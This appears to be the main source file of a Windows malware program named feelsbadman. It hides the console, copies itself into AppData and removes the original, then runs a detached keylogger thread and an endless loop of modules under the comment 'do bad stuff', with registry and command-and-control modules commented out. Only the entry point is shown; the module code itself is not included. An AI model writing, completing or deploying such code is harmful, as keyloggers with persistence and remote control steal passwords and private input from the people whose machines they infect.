// feelsbadman.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include "C2.h"
#include "CP.h"
#include "RM.h"
#include "DB.h"
#include "RG.h"
#include "MP.h"
#include "KB.h"
#include "UTIL.h";
#include <iostream>
#include <thread>

int main()
{
	FreeConsole();

	// instantiate modules
	CP copyModule;
	C2 connModule;
	RM remvModule;
	DB debgModule;
	RG regsModule;
	MP msptModule;
	UTIL util;
	
	if (!util.isExecutingFromAppData()) {
		copyModule.execute();
		debgModule.execute();
		remvModule.execute();
		return 0;
	}

	thread keylogger(keyLoop);
	keylogger.detach();

	while (true) {
		// do bad stuff
		//regsModule.execute();
		debgModule.execute();
		//connModule.execute();
		msptModule.execute();
		Sleep(20000);
	}
}



